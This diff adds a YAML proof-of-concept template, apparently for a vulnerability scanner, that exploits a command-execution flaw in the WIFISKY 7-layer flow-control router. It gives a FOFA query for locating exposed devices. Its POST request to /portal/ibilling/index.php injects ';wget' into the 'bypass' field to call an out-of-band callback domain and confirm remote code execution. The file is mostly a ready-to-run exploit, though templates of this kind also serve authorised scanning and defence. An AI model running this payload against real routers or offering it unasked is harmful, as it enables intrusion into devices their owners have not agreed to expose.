@@ -1,0 +1,22 @@
+id: poc-yaml-wifisky-7-story-flow-control-router-index-rce
+info:
+  name: WIFISKY 7层流控路由器index存在命令执行漏洞
+  severity: critical
+  tags:
+  - DNSLOG
+  - rce
+  finger: 7层流控路由器
+  fofa: title="WIFISKY 7层流控路由器"
+variables:
+  reverse: new_dns_log()
+  reverseDomain: reverse.Domain()
+requests:
+- method: POST
+  path: /portal/ibilling/index.php
+  headers:
+    Content-Type: application/x-www-form-urlencoded
+  data: '{"type":5,"version":2,"bypass":";wget {{.reverseDomain}}"}
+
+    '
+  expression: "status_code == 200 && \nreverse.Verify()\n"
+transport: http
